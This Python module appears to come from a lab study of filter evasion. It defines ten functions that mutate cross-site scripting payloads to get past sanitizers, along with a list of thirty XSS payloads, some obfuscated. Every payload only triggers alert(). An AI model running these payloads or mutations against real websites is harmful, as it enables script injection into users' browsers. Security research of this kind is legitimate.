"""Mutations besides Chen/Pasini Table 2. Local lab only."""

from __future__ import annotations

import re

SCRIPT_OPEN = re.compile(r"<script\b", re.I)
IMG_OPEN = re.compile(r"<img\b", re.I)


def ext_slash_tag(payload: str) -> str:
    return re.sub(r"<([a-zA-Z]+)(\s+)", r"<\1/", payload, count=2)


def ext_newline_tag(payload: str) -> str:
    return re.sub(r"<([a-zA-Z]{3,})", lambda m: "<" + m.group(1)[:3] + "\n" + m.group(1)[3:], payload, count=1)


def ext_script_type(payload: str) -> str:
    if SCRIPT_OPEN.search(payload):
        return SCRIPT_OPEN.sub('<script type="text/javascript"', payload, count=1)
    return payload


def ext_svg_wrap(payload: str) -> str:
    return "<svg>" + payload + "</svg>"


def ext_srcdoc(payload: str) -> str:
    inner = payload.replace('"', "&quot;")
    return f'<iframe srcdoc="{inner}"></iframe>'


def ext_optional_alert(payload: str) -> str:
    return re.sub(r"\balert\s*\(", "alert?.(", payload)


def ext_paren_alert(payload: str) -> str:
    return re.sub(r"\balert\s*\(", "(alert)(", payload)


def ext_autofocus(payload: str) -> str:
    return '<input autofocus onfocus=alert(1)>' + payload


def ext_details(payload: str) -> str:
    return "<details open ontoggle=alert(1)>" + payload + "</details>"


def ext_svg_onload(payload: str) -> str:
    return "<svg/onload=alert(1)>" + payload


EXT_ACTIONS = {
    "E1_slash_tag": ext_slash_tag,
    "E2_newline_tag": ext_newline_tag,
    "E3_script_type": ext_script_type,
    "E4_svg_wrap": ext_svg_wrap,
    "E5_srcdoc": ext_srcdoc,
    "E6_optional_alert": ext_optional_alert,
    "E7_paren_alert": ext_paren_alert,
    "E8_autofocus": ext_autofocus,
    "E9_details": ext_details,
    "E10_svg_onload": ext_svg_onload,
}

TAP_B = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg onload=alert(1)>",
    "<details open ontoggle=alert(1)>x</details>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<marquee onstart=alert(1)>x</marquee>",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<img/src=x onerror=alert(1)>",
    "<img src=x onerror=alert`1`>",
    "<img src=x onerror=top['al'+'ert'](1)>",
    "<script>top[8680439..toString(30)](1)</script>",
    "<script src=data:,alert(1)></script>",
    "<svg><script>alert(1)</script></svg>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s />",
    "<math><mtext></mtext></math><img src=x onerror=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<form><button formaction=javascript:alert(1)>x</button></form>",
    "<img src=x onerror=eval('alert(1)')>",
    "<img src=x onerror=alert(document.domain)>",
    "<a href=javascript:alert(1)>x</a>",
    "<img src=x:alert(1) onerror=eval(src)>",
    "<script>Function('alert(1)')()</script>",
    "<iframe src=javascript:alert(1)>",
    "<object data='data:text/html,<script>alert(1)</script>'>",
    "<img src=x onerror=window['alert'](1)>",
]
